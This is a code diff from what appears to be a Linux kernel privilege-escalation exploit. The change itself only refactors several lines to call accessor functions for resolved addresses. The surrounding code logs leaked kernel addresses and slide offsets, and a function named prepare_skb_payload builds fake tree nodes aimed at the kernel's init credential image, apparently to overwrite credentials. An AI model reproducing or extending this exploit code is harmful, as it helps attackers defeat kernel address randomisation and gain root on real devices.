@@ -115,8 +115,10 @@ void log_startup_context(void) {
              "delta=%016llx slide_logger=%016llx bootid_data=%016llx "
              "init_task=%016llx root_tg=%016llx sysctl_bootid=%016llx\n",
              getpid(), (unsigned long long)P0_PHYS_OFFSET,
-             (unsigned long long)g_resolved_addresses.kernel_phys_load,
-             (unsigned long long)(g_resolved_addresses.kernel_phys_load -
+             (unsigned long long)resolved_addresses_kernel_phys_load(
+                 &g_resolved_addresses),
+             (unsigned long long)(resolved_addresses_kernel_phys_load(
+                 &g_resolved_addresses) -
                                   P0_PHYS_OFFSET),
              (unsigned long long)SLIDE_NFULNL_LOGGER,
              (unsigned long long)SLIDE_RANDOM_BOOT_ID_DATA,
@@ -153,8 +155,10 @@ long sched_setattr_tid(int tid, int nice_value) {
  * profile; output: ResolvedAddresses. Future: resolve_runtime_addresses(). */
 void init_p0_profile(void) {
   pr_info("p0 kernel_phys_load=%016llx delta=%016llx\n",
-          (unsigned long long)g_resolved_addresses.kernel_phys_load,
-          (unsigned long long)(g_resolved_addresses.kernel_phys_load -
+          (unsigned long long)resolved_addresses_kernel_phys_load(
+              &g_resolved_addresses),
+          (unsigned long long)(resolved_addresses_kernel_phys_load(
+              &g_resolved_addresses) -
                                P0_PHYS_OFFSET));
 }
 
@@ -383,7 +387,8 @@ int prepare_skb_payload(uintptr_t base, const WriteRequest *request) {
   PayloadWriteLayout write_layout = payload_write_layout(
       request, base, default_fops, credential_fops,
       resolved_addresses_data_alias(&g_resolved_addresses,
-                                    g_resolved_addresses.init_cred_image));
+                                    resolved_addresses_init_cred_image(
+                                        &g_resolved_addresses)));
   fake_parent = write_layout.parent;
   fake_right = write_layout.right;
   fake_left = write_layout.left;
